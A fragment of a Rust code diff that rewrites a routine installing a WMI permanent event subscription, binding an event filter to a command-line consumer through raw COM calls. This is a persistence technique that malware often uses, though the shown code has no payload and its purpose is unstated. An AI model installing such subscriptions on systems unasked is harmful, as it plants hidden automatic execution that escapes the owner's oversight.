-        let binding_class = binding_class.ok_or("failed to get __FilterToConsumerBinding class")?;
-
-        let binding_inst = binding_class.SpawnInstance(0).map_err(|e| e.to_string())?;
-
-        let filter_path = format!("__EventFilter.Name=\"{}\"", task_name);
-        let consumer_path = format!("CommandLineEventConsumer.Name=\"{}\"", task_name);
-
-        put_prop(&binding_inst, "Filter", &filter_path)?;
-        put_prop(&binding_inst, "Consumer", &consumer_path)?;
-
-        services
-            .PutInstance(
-                &binding_inst,
-                WBEM_GENERIC_FLAG_TYPE(WBEM_FLAG_CREATE_OR_UPDATE.0 as _),
-                None,
-                None,
-            )
-            .map_err(|e| e.to_string())?;
+                ((*(*services).lp_vtbl).put_instance)(
+                    services,
+                    binding_inst,
+                    crate::recovery::helpers::com_defs::WBEM_FLAG_CREATE_OR_UPDATE,
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                );
+                ((*(*binding_inst).lp_vtbl).parent.release)(binding_inst as *mut _);
+            }
+            ((*(*binding_class).lp_vtbl).parent.release)(binding_class as *mut _);
+        }
 
         debug!("WMI permanent event subscription installed successfully");
+        ((*(*services).lp_vtbl).parent.release)(services as *mut _);
+        ((*(*locator).lp_vtbl).parent.release)(locator as *mut _);
     }
 
     Ok(())
 }
+
